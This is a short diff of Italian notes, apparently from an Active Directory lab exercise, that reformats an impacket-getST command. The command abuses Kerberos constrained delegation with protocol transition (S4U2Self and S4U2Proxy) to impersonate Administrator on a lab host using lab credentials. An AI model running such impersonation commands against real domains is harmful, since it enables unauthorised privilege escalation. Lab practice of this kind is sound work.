@@ -28,5 +28,6 @@ impacket-findDelegation NORTH.SEVENKINGDOMS.LOCAL/arya.stark:Needle -target-doma
 *Con protocol transition*
 
 Per exploitarlo isogna prima chiedere un TGT per l'utente e poi esguire S4U2Self seguito d S4U2Proxy per impersonare un admin
-
-getST.py -spn 'CIFS/winterfell' -impersonate Administrator -dc-ip '192.168.56.11' 'north.sevenkingdoms.local/jon.snow:iknownothing'
+```bash
+impacket-getST -spn 'CIFS/winterfell' -impersonate Administrator -dc-ip '192.168.56.11' 'north.sevenkingdoms.local/jon.snow:iknownothing'
+```
